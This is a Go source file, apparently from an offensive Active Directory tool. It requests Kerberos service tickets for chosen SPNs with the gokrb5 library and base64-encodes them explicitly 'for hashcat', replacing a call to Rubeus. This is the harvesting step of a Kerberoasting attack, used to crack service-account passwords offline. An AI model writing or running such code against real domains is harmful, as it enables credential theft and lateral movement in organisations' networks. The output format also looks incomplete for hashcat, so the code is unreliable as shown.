// pkg/kerberos/kerberos.go
package kerberos

import (
	"encoding/base64"
	"fmt"
	"strings"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/spnego"
)

// GetServiceTicket demande un TGS pour un SPN via gokrb5 (natif Go)
// CORRECTION : remplace l'appel à Rubeus.exe
func GetServiceTicket(username, domain, password, spn string) (string, error) {
	// Construire la config Kerberos dynamiquement
	krb5Conf := fmt.Sprintf(`[libdefaults]
	default_realm = %s
	dns_lookup_kdc = true
[realms]
	%s = {
		kdc = %s
		admin_server = %s
	}`, strings.ToUpper(domain), strings.ToUpper(domain), domain, domain)

	cfg, err := config.NewFromString(krb5Conf)
	if err != nil {
		return "", fmt.Errorf("invalid Kerberos configuration: %v", err)
	}

	cl := client.NewWithPassword(username, strings.ToUpper(domain), password, cfg,
		client.DisablePAFXFAST(true),
	)

	if err := cl.Login(); err != nil {
		return "", fmt.Errorf("Kerberos login failed for %s@%s: %v", username, domain, err)
	}
	defer cl.Destroy()

	// Demander le ticket de service
	tkt, _, err := cl.GetServiceTicket(spn)
	if err != nil {
		return "", fmt.Errorf("Unable to obtain the TGS for %s: %v", spn, err)
	}

	// Encoder le ticket en base64 pour l'affichage / hashcat
	_ = spnego.SPNEGOToken{}
	ticketBytes, err := tkt.Marshal()
	if err != nil {
		return "", fmt.Errorf("marshal ticket failed: %v", err)
	}

	return base64.StdEncoding.EncodeToString(ticketBytes), nil
}
